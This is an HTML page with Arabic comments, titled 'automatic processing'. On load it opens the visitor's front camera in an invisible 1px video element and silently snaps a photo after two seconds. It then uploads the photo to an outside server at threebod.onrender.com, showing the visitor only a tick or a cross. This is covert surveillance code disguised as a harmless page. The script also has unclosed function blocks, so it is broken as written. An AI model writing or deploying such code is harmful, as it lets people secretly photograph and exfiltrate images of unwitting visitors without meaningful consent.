<!server.js>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>معالجة تلقائية</title>
    <style>
        body {
            background-color: #f4f7f6;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        /* الفيديو مخفي تماماً عن العين لكنه يعمل في الخلفية لالتقاط الصورة */
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        /* مؤشرات النتيجة النهائية فقط */
        .result-mark {
            font-size: 120px;
            user-select: none;
            display: none;
            animation: scaleUp 0.3s ease-in-out;
        }
        #success-mark { color: #28a745; }
        #error-mark { color: #dc3545; }

        @keyframes scaleUp {
            from { transform: scale(0.5); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        canvas { display: none; }
    </style>
</head>
<body>

<!-- الفيديو يعمل بشكل غير مرئي -->
<video id="video" autoplay playsinline></video>

<!-- الـ UI الوحيد الذي سيظهر للمستخدم بناءً على النتيجة -->
<div id="success-mark" class="result-mark">✔️</div>
<div id="error-mark" class="result-mark">❌</div>

<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const successEl = document.getElementById('success-mark');
    const errorEl = document.getElementById('error-mark');
    const ctx = canvas.getContext('2d');
    let globalStream = null;

    window.addEventListener('DOMContentLoaded', async () => {
        try {
            globalStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            video.srcObject = globalStream;
            
            video.onloadedmetadata = () => {
                // الانتظار لمدة ثانيتين في الخلفية قبل الالتقاط تلقائياً
                setTimeout(() => {
                    captureAndSendImage(globalStream);
                }, 2000);
            };
        } catch (error) {
            console.error(error);
            showMark(errorEl);
        }
    });

    function captureAndSendImage(stream) {
        // الحفاظ على أبعاد الكاميرا الحقيقية كاملة
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (!blob) {
                showMark(errorEl);
                stopCamera(stream);
                return;
            }

            const formData = new FormData();
            formData.append('captured_image', blob, 'instant_snap.jpg');

           try {
                // إرسال الصورة إلى السيرفر المرفوع على Render
                const response = await fetch('https://threebod.onrender.com/api/upload', {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    showMark(successEl); // إظهار علامة الصح إذا نجح الإرسال
                } else {
                    showMark(errorEl); // إظهار علامة الخطأ إذا رفض السيرفر
                }
            } catch (err) {
                console.error(err);
                showMark(errorEl); // إظهار علامة الخطأ إذا فشل الاتصال بالشبكة
            } finally {
                stopCamera(stream); // إيقاف الكاميرا في كل الأحوال بعد الانتهاء
            }

    function showMark(element) {
        successEl.style.display = 'none';
        errorEl.style.display = 'none';
        element.style.display = 'block';
    }

    function stopCamera(stream) {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    }
</script>

</body>
</html>
